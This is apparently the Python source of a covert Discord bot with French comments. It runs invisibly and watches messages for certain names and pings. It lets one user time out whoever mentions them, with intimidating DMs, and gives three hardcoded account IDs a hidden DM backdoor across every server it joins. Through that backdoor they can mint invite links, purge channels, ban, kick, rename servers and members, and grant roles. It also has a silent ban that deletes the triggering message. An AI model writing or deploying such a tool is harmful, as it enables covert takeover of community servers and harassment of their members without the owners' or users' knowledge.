import discord
from discord.ext import commands
import os
import datetime
from flask import Flask
from threading import Thread

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Identifiants autorisés et configuration des cibles/surveillances
AUTHORIZED_IDS = [1402771839029219442, 996157528092184687, 776111075036889160]
TARGET_USERNAME = "akz_92"
VICTIME_NAME = "m1zuki_1"

# Mots clés de surveillance par groupes
MOTS_GROUPE_1 = ["tom", "kyzo", "kaizo", "chinois sans nems"]
MOTS_GROUPE_2 = ["hamza", "ogi"]
MOTS_CLES = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"] + MOTS_GROUPE_1 + MOTS_GROUPE_2

# Stockage temporaire pour les demandes de timeout
pending_timeouts = {}

# --- SERVEUR WEB POUR GARDER LE BOT ACTIF SUR RENDER ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot en ligne !"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Fonction utilitaire pour récupérer un serveur soit par son ID, soit par un lien/code d'invitation
async def get_guild_from_input(identifier):
    if identifier.isdigit():
        return bot.get_guild(int(identifier))
    try:
        code = identifier.split("/")[-1]
        invite = await bot.fetch_invite(code)
        return invite.guild
    except:
        return None

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.invisible)
    print(f"Bot furtif opérationnel et invisible. Surveillance active.")

# =========================================================================
# AUTO-ROLE : Ajoute automatiquement le rôle "Membre" à akz_92
# =========================================================================
@bot.event
async def on_member_update(before, after):
    if after.name == TARGET_USERNAME:
        role = discord.utils.get(after.guild.roles, name="Membre")
        if role and role not in after.roles:
            try:
                await after.add_roles(role)
            except:
                pass

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # =========================================================================
    # COMMANDE PUBLIQUE : !untoakz (Retire le timeout d'akz_92)
    # =========================================================================
    if message.content.startswith("!untoakz"):
        try:
            guild = message.guild
            member = guild.get_member_named(TARGET_USERNAME) or discord.utils.get(guild.members, name=TARGET_USERNAME)
            if member:
                await member.timeout(None, reason="Utilisation de !untoakz par un membre")
                await message.channel.send("✅ Timeout retiré pour akz_92.")
        except Exception as e:
            pass

    # =========================================================================
    # 0. SYSTEME DE SURVEILLANCE & CIBLES VERROUILLÉES
    # =========================================================================
    content_lower = message.content.lower()
    is_ping_groupe1 = any(str(uid) in message.content for uid in [1402771839029219442, 776111075036889160])
    is_ping_groupe2 = "996157528092184687" in message.content
    
    declenche = False
    if any(mot in content_lower for mot in MOTS_CLES) or is_ping_groupe1 or is_ping_groupe2:
        if message.author.name != VICTIME_NAME and message.author.id not in AUTHORIZED_IDS:
            declenche = True

    if declenche:
        victime = discord.utils.get(message.guild.members, name=VICTIME_NAME) or discord.utils.get(message.guild.members, id=996157528092184687)
        if victime:
            pending_timeouts[message.author.id] = message.author
            try:
                await victime.send(
                    f"🚨 **Cible verrouillée** 🚨\n"
                    f"L'utilisateur '{message.author.name}' a prononcé un mot surveillé ou un ping.\n"
                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
                )
            except:
                pass

    # Réponses en DM pour valider ou non le timeout
    if isinstance(message.channel, discord.DMChannel) and (message.author.name == VICTIME_NAME or message.author.id in AUTHORIZED_IDS):
        content = message.content.lower().strip()
        if content in ["oui", "non"]:
            if pending_timeouts:
                user_id = list(pending_timeouts.keys())[0]
                target = pending_timeouts[user_id]
                
                if content == "oui":
                    try:
                        duration = datetime.timedelta(minutes=10)
                        await target.timeout(duration, reason="Punition surveillance")
                        await message.author.send("redis plus jamais mon nom sans mon autorisation")
                        await message.author.send("je vois tout j'entends tout")
                        # Le bot se fait kick du serveur où s'est produit l'incident si possible
                        if message.guild:
                            await message.guild.kick(bot.user, reason="Auto-kick suite au 'oui'")
                        await message.author.send(f"✅ L'utilisateur {target.name} a pris un timeout de 10 min.")
                    except Exception as e:
                        await message.author.send(f"❌ Erreur : {e}")
                else:
                    await message.author.send("✅ Action annulée.")
                
                pending_timeouts.pop(user_id)
            else:
                await message.author.send("Aucune cible en attente.")
            return

    # =========================================================================
    # 1. GESTION DES DM (Contrôle à distance sécurisé pour les IDs autorisés)
    # =========================================================================
    if isinstance(message.channel, discord.DMChannel):
        if message.author.id not in AUTHORIZED_IDS:
            return

        args = message.content.split()
        if not args: return
        cmd = args[0].lower()

        try:
            if cmd == "serveurs":
                txt = "\n".join([f"{g.name} (ID: {g.id})" for g in bot.guilds])
                await message.author.send(f"📋 Serveurs :\n{txt}")

            elif cmd == "liens":
                links_output = "🔗 **Liens d'invitation de tous les serveurs :**\n"
                for g in bot.guilds:
                    try:
                        invite = None
                        for c in g.text_channels:
                            try:
                                invite = await c.create_invite(max_uses=1, max_age=3600)
                                break
                            except:
                                continue
                        if invite:
                            links_output += f"- **{g.name}** : {invite.url}\n"
                        else:
                            links_output += f"- **{g.name}** : ❌ Pas de permission\n"
                    except:
                        links_output += f"- **{g.name}** : ❌ Erreur\n"
                await message.author.send(links_output)

            elif cmd == "dire":
                target_channel = bot.get_channel(int(args[1]))
                await target_channel.send(" ".join(args[2:]))
                await message.author.send("✅ Envoyé.")

            elif cmd == "purge":
                channel = bot.get_channel(int(args[1]))
                deleted = await channel.purge(limit=int(args[2]))
                await message.author.send(f"✅ {len(deleted)} messages supprimés.")

            elif cmd == "ban":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.ban(reason="Banni via DM")
                await message.author.send("✅ Utilisateur banni.")

            elif cmd == "unban":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                user_obj = await bot.fetch_user(int(args[2]))
                await guild.unban(user_obj, reason="Débannissement via DM")
                await message.author.send(f"✅ L'utilisateur {user_obj.name} a été débanni de {guild.name}.")

            elif cmd == "untimeout":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.timeout(None, reason="Retrait du timeout via DM")
                await message.author.send(f"✅ Timeout retiré pour {member.name}.")

            elif cmd == "kick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.kick()
                await message.author.send("✅ Utilisateur expulsé.")

            elif cmd == "role":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                role = await guild.create_role(name=args[2])
                await message.author.send(f"✅ Rôle {role.name} créé.")

            elif cmd == "setrolename":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                role_input = args[2]
                new_role_name = " ".join(args[3:])
                role = None
                if role_input.isdigit():
                    role = guild.get_role(int(role_input))
                if not role:
                    role = discord.utils.get(guild.roles, name=role_input)
                if role:
                    await role.edit(name=new_role_name)
                    await message.author.send(f"✅ Rôle renommé en '{new_role_name}'.")
                else:
                    await message.author.send("❌ Rôle introuvable.")

            elif cmd == "puissance":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                
                target_input = args[2]
                member = None
                if target_input.isdigit():
                    try:
                        member = await guild.fetch_member(int(target_input))
                    except:
                        pass
                if not member:
                    member = discord.utils.find(lambda m: m.name == target_input or m.display_name == target_input, guild.members)

                if not member:
                    await message.author.send(f"❌ Impossible de trouver l'utilisateur '{target_input}' sur ce serveur.")
                    return

                role = discord.utils.get(guild.roles, name="La puissance")
                if not role:
                    await message.author.send("❌ Le rôle 'La puissance' n'existe pas sur ce serveur.")
                    return

                await member.add_roles(role, reason="Attribué via la commande puissance")
                await message.author.send(f"✅ Le rôle 'La puissance' a été attribué à {member.name} sur {guild.name}.")

            elif cmd == "nick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                await guild.me.edit(nick=args[2])
                await message.author.send("✅ Mon pseudo a été changé.")

            elif cmd == "setname":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                new_name = " ".join(args[2:])
                await guild.edit(name=new_name)
                await message.author.send(f"✅ Nom du serveur modifié : {new_name}")

            elif cmd == "setnick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                new_nickname = " ".join(args[3:])
                await member.edit(nick=new_nickname)
                await message.author.send(f"✅ Pseudo de {member.name} modifié.")

            elif cmd == "salon":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                channel_name = " ".join(args[2:])
                new_channel = await guild.create_text_channel(channel_name)
                await message.author.send(f"✅ Salon #{new_channel.name} créé (ID: {new_channel.id}).")

            elif cmd == ".kyzo" or cmd == "kyzo":
                await message.author.send("✅ Commande .kyzo bien exécutée et opérationnelle !")

        except Exception as e:
            await message.author.send(f"❌ Erreur : {e}")
        return

    # =========================================================================
    # 2. COMMANDE .ban SUR LE SERVEUR (Silencieuse / Réservée aux IDs autorisés)
    # =========================================================================
    if message.content.startswith(".ban"):
        if message.author.id in AUTHORIZED_IDS:
            try:
                await message.delete()
            except:
                pass

            if message.mentions:
                target = message.mentions[0]
                guild = message.guild

                try:
                    await guild.ban(target, reason="Banni discrètement via .ban")
                except Exception as e:
                    try:
                        await message.author.send(f"❌ Erreur lors du ban furtif : {e}")
                    except:
                        pass

# Lancement du serveur web pour Render
keep_alive()

# Lancement sécurisé via la variable d'environnement
bot.run(os.getenv("TOKEN"))
